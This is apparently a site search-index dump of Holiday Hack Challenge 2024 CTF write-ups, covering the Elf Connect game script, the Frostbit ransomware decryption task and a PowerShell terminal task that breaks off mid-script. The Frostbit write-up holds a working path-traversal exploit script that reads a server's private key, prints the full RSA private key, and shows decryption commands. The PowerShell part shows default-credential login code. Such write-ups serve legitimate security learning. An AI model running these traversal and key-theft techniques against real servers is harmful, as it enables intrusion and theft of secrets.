displaySuccessMessage('Round ' + roundComplete + ' Completed', function () { this.sessionStorage.setItem('score', score); this.sessionStorage.setItem('roundComplete', roundComplete); window.location.href = `${window.location.origin}${window.location.pathname}?round=${roundComplete + 1}`; }); } else { emitter.explode(20); submitAction(1); displaySuccessMessage.call(this, 'Success! You have defeated the Elf Connect!!!!'); } } async function submitAction(answer) { //const urlParams = new URLSearchParams(window.location.search); //const id = urlParams.get('id'); //localStorage.setItem('id', id); let id = localStorage.getItem('id'); if (!id) { alert('No ID found in localstorage so we could not submit your results'); } const url = `/submit?id=${id}`; const data = { answer: answer }; // Send the answer as a JSON object //Original //const url = '/submit'; //const data = { answer: answer }; try { const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); if (response.ok) { const result = await response.json(); console.log('Success:', result); return true; } else { console.error('Error:', response.statusText); } } catch (error) { console.error('Error:', error); } } function displaySuccessMessage(message, callback) { if (successText) { successText.destroy(); } if (successBackground) { successBackground.destroy(); } const padding = 10; const textStyle = { fontSize: '24px', fill: '#00FF00', align: 'center' }; successText = mainScene.add.text(mainScene.cameras.main.centerX, mainScene.cameras.main.centerY, message, textStyle); successText.setOrigin(0.5, 0.5); const textWidth = successText.width + 2 * padding; const textHeight = successText.height + 2 * padding; successBackground = mainScene.add.graphics(); successBackground.fillStyle(0x000000, 0.8); successBackground.fillRect( mainScene.cameras.main.centerX - textWidth / 2, mainScene.cameras.main.centerY - textHeight / 2, textWidth, textHeight ); mainScene.children.bringToTop(successText); setTimeout(() =\u003e { if (successText) { successText.destroy(); successText = null; } if (successBackground) { successBackground.destroy(); successBackground = null; } //console.log(roundComplete) if (roundComplete != 4) { callback(); } }, 3000); }",
    "description": "Objective Help Angel Candysalt connect the dots in a game of connections.\nObservations # Observation 1 Inspected network traffic, game is hosted at https://hhc24-elfconnect.holidayhackchallenge.com/ 2 Playing game through Burpsuite we can get hold of the Javascript controlling the game 3 In Javascript, variable “wordSets” holds the words 4 In Javascript, variable “correctSets” holds the correct words for each round 5 Round is controlled by https://hhc24-elfconnect.holidayhackchallenge.com/?round=2 6 It appears that “correctSets” isn’t updated between rounds.",
    "tags": [],
    "title": "Elf Connect",
    "uri": "/prologue/elf-connect/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act3",
    "content": "Objective Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.\nHints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be broadcasting MQTT messages. Dusty Giftwrap The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use. Dusty Giftwrap I’m with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It’s great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes. IOC’s IOC’s from frostbit_core_dump.13 Endpoints strings frostbit_core_dump.13 | grep http https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0 https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit Ransomware note https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0 Links in screenshot verified to not be working.\nIn addition, from the hints (or conversations) it was mentioned a certain debug mode, which can be enabled by adding a “debug” GET parameter equals to 1:\nhttps://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0\u0026debug=1 Toying with various parameters gives different results, in this case removing one character from the digest:\n{ \"debug\": true, \"error\": \"Status Id File Digest Validation Error: Traceback (most recent call last):\\n File \\\"/app/frostbit/ransomware/static/FrostBiteHashlib.py\\\", line 55, in validate\\n decoded_bytes = binascii.unhexlify(hex_string)\\nbinascii.Error: Odd-length string\\n\" } I notice a reference to a Python file I have found already using a Google Dork. Further, toying with the “Fgcse2IEk5zg3BhQhlL” part of the URL yields this error:\n{ \"debug\": true, \"error\": \"Status Id File Not Found\" } And the UUID part (15d977db-9fa9-48f8-be38-d36c2e21b12d):\n{ \"debug\": true, \"error\": \"Invalid UUID Format\" } Nonce https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session { \"nonce\": \"e998a50d979ee2d7\" } Invalid API Path https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit { \"error\": \"Invalid API Path\" } Encrypted key JSON strings frostbit_core_dump.13 -n 10 | grep -i nonce Output:\n{\"encryptedkey\":\"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f\",\"nonce\":\"\"} Unspecified IOC’s The following IOC’s were collected using the following command:\nstrings frostbit_core_dump.13 -n50 Unrecognized JSON 1 {\"digest\":\"10044402b080a8example202088819b8\",\"status\":\"Key Set\",\"statusid\":\"ZGTw7qlexampleQNiW\"} {\"digest\":\"0081c004828085c081a0e424db82a0a0\",\"status\":\"Key Set\",\"statusid\":\"Fgcse2IEk5zg3BhQhlL\"} Long HEX text 2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f Client and Server handshakes and secrets CLIENT_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 95d29ae475a8cca66237ae742e80ef054694f1cac76005718eda63098ea1ed54 SERVER_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 60fad6da7c95990bbdaa9c642d8d7f9babb7da4017a709a00b899176ca431807 CLIENT_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 3a582c4fb15aa9f10aecdaa72ca7b73ae0dfdd8126dd64aa18b3ab80c3957331 SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 784b9c051b6ed71221f367cc790ac1b1c8dd70dd8690c69f01262745bf61cd78 Note These values when put into a text file and referenced in “(Pre)-Master-Secret log filename”, will decode the TLS entries in the associated PCAP.\nPOST request for key POST /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key HTTP/1.1 IOC’s from PCAP Once loaded the Client and Server handshakes and secrets, we can decrypt and follow the TLS stream in PCAP:\nGET /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session HTTP/1.1 Host: api.frostbit.app User-Agent: Go-http-client/1.1 Accept-Encoding: gzip HTTP/1.1 200 OK Server: nginx/1.27.1 Date: Fri, 20 Dec 2024 11:00:08 GMT Content-Type: application/json Content-Length: 29 Connection: keep-alive Strict-Transport-Security: max-age=31536000 {\"nonce\":\"e998a50d979ee2d7\"} POST /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key HTTP/1.1 Host: api.frostbit.app User-Agent: Go-http-client/1.1 Content-Length: 1070 Content-Type: application/json Accept-Encoding: gzip {\"encryptedkey\":\"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f\",\"nonce\":\"e998a50d979ee2d7\"} HTTP/1.1 200 OK Server: nginx/1.27.1 Date: Fri, 20 Dec 2024 11:00:08 GMT Content-Type: application/json Content-Length: 98 Connection: keep-alive Strict-Transport-Security: max-age=31536000 {\"digest\":\"0081c004828085c081a0e424db82a0a0\",\"status\":\"Key Set\",\"statusid\":\"Fgcse2IEk5zg3BhQhlL\"} OSINT Dorking on Google I found:\nThe content of the Python file is:\nimport traceback import binascii class Frostbyte128: def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16): self.file_bytes = file_bytes self.filename_bytes = filename_bytes self.filename_bytes_length = len(self.filename_bytes) self.nonce_bytes = nonce_bytes self.nonce_bytes_length = len(self.nonce_bytes) self.hash_length = hash_length self.hash_result = self._compute_hash() def _compute_hash(self) -\u003e bytes: hash_result = bytearray(self.hash_length) count = 0 for i in range(len(self.file_bytes)): xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length] hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd count += 1 for i in range(len(self.filename_bytes)): count_mod = count % self.hash_length count_filename_mod = count % self.filename_bytes_length count_nonce_mod = count % self.nonce_bytes_length xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod] hash_result[count_mod] = hash_result[count_mod] \u0026 xrd count += 1 return bytes(hash_result) def digest(self) -\u003e bytes: \"\"\"Returns the raw binary hash result.\"\"\" return self.hash_result def hexdigest(self) -\u003e str: \"\"\"Returns the hash result as a hexadecimal string.\"\"\" return binascii.hexlify(self.hash_result).decode() def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None): \"\"\"Updates the internal state with new bytes and recomputes the hash.\"\"\" if file_bytes is not None: self.file_bytes = file_bytes if filename_bytes is not None: self.filename_bytes = filename_bytes if nonce_bytes is not None: self.nonce_bytes = nonce_bytes self.hash_result = self._compute_hash() def validate(self, hex_string: str): \"\"\"Validates if the provided hex string matches the computed hash.\"\"\" try: decoded_bytes = binascii.unhexlify(hex_string) if decoded_bytes == self.digest(): return True, None except Exception as e: stack_trace = traceback.format_exc() return False, f\"{stack_trace}\" return False, None From other objectives The Santa Vision objective had some references to Frostbit in the feeds:\nAppears this path might be important: /etc/nginx/certs/api.frostbit.app.key\nSolution Gold import requests import urllib.parse nonce = bytes([ 0xe9, 0x98, 0xa5, 0x0d, 0x97, 0x9e, 0xe2, 0xd7, 0xe9, 0x98, 0xa5, 0x0d, 0x97, 0x9e, 0xe2, 0xd7, ]) nonce_string = \"%25\".join(f\"{byte:02x}\" for byte in nonce) separator = urllib.parse.quote_plus(urllib.parse.quote_plus(\"/\")) payload = f\"%25{nonce_string}{separator}\" url = f\"https://api.frostbit.app/view/{payload}..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1\u0026digest=00000000000000000000000000000000\" res = requests.get(url) print(url) print(res.text) Which gave an URL\nhttps://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1\u0026digest=00000000000000000000000000000000 Upon visiting it, it showed me:\nThe RSA PRIVATE KEY is:\n-----BEGIN RSA PRIVATE KEY----- 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 -----END RSA PRIVATE KEY----- I quickly tested decrypted the encrypted CSV file, but it wasn’t doable. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key:\n{\"encryptedkey\":\"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f\",\"nonce\":\"e998a50d979ee2d7\"} Whipping up a simple decoder script:\necho -n \"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f\" | xxd -r -p \u003e encrypted_data.bin openssl pkeyutl -decrypt -inkey key.pem -in encrypted_data.bin -out decrypted_data_1 With this script I got the following output:\n52685b92ec2ae608c3fe1eedc3789953,e998a50d979ee2d7 Appears to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based:\nAnswer: Xena Xtreme",
    "description": "Objective Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.\nHints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information.",
    "tags": [],
    "title": "Elf Frostbit Decrypt",
    "uri": "/act3/elf-frostbit-decrypt/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "Wombley’s getting desparate. Out-elved by Alabaster’s faction, he’s planning a gruesome snowball fight to take over present delivery!\nPiney, Chimney, and Eve each need your help.\nBoth sides want to see Christmas mission fulfilled. Will either yield? Who can bring order to such chaos?",
    "description": "Wombley’s getting desparate. Out-elved by Alabaster’s faction, he’s planning a gruesome snowball fight to take over present delivery!\nPiney, Chimney, and Eve each need your help.\nBoth sides want to see Christmas mission fulfilled. Will either yield? Who can bring order to such chaos?",
    "tags": [],
    "title": "Act2",
    "uri": "/act2/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Objecetive Team Wombley is developing snow weapons in preparation for conflict, but they’ve been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.\nSolution Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path \".\\welcome.txt\" Output\nSystem Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel. Lockdown Protocols When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered. Access and System Restoration To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated. Task 2 Geez that sounds ominous, I’m sure we can get past the defense mechanisms. We should warm up our PowerShell skills. How many words are there in the file? (Get-Content -Path \".\\welcome.txt\" -Raw) -split '\\s+' | Where-Object { $_ -ne '' } | Measure-Object | Select-Object -ExpandProperty Count Output\n180 Task 3 There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on? netstat -an | Select-String 'LISTEN' Output\ntcp 0 0 127.0.0.1:1225 0.0.0.0:* LISTEN unix 2 [ ACC ] STREAM LISTENING 350156949 /tmp/CoreFxPipe_PSHos t.DB3DA5D4.143.None.pwsh unix 2 [ ACC ] STREAM LISTENING 350148184 /tmp/tmux-1050/default unix 2 [ ACC ] STREAM LISTENING 350154640 /tmp/dotnet-diagnosti c-143-25076401-socket Task 4 You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get? Invoke-WebRequest -Uri \"http://127.0.0.1:1225\" Output\nInvoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED). Task 5 It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password. Invoke-WebRequest -Uri \"http://127.0.0.1:1225\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing Output\nStatusCode : 200 StatusDescription : OK Content : \u003chtml\u003e \u003cbody\u003e \u003cpre\u003e ---------------------------------------------------- 🪖 Elf MFA webserver🪖 ⚔️ Grab your tokens for access to weaponry ⚔️ ⚔️ Warning! Sensitive information on the server, protect a… RawContent : HTTP/1.1 200 OK Server: Werkzeug/3.0.6 Server: Python/3.10.12 Date: Sat, 23 Nov 2024 13:04:34 GMT Connection: close Content-Type: text/html; charset=utf-8 Content-Length: 3475 \u003chtml\u003e \u003cbody\u003e \u003cpre\u003e ---… Headers : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…} Images : {} InputFields : {} Links : {@{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/1\"\u003eEndpoint 1\u003c/a\u003e; tagName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/2\"\u003eEndpoint 2\u003c/a\u003e; tagName=A; href=htt p://localhost:1225/endpoints/2}, @{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/3\"\u003eEndpoint 3\u003c/a\u003e; tagName=A; href=http://localhost:1225/endpoints/3}, @{outerHTML=\u003ca href=\"http://localhost:1225/endpoints/4\"\u003eEnd point 4\u003c/a\u003e; tagName=A; href=http://localhost:1225/endpoints/4}…} RawContentLength : 3475 RelationLink : {} Task 6 There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal. # Define the base URL and credentials $baseUrl = \"http://127.0.0.1:1225\" $credentials = \"admin:admin\" $encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials)) # Set the headers for authorization $headers = @{ Authorization = \"Basic $encodedAuth\" } # Perform the initial web request to get the main page content $response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing # Filter the links to those that match the endpoint pattern $endpointLinks = $response.Links | Where-Object { $_.href -like \"http://localhost:1225/endpoints/*\" } # Loop through each endpoint link foreach ($link in $endpointLinks) { # Request the content of the current endpoint $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers 